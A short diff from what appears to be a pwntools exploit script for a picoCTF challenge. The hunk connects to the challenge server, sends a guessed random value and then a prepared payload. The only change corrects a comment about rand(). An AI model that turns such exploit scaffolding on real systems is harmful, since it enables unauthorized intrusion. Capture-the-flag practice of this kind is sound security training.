@@ -52,7 +52,7 @@ print(len(p))
 
 r = remote('jupiter.challenges.picoctf.org', 39940)
 #r = process('/tmp/vuln')
-# default value of rand() % 100 + 100
+# default value of rand() % 100 + 1
 r.sendline(b'84')
 r.sendline(p)
 #print(r.recvall())
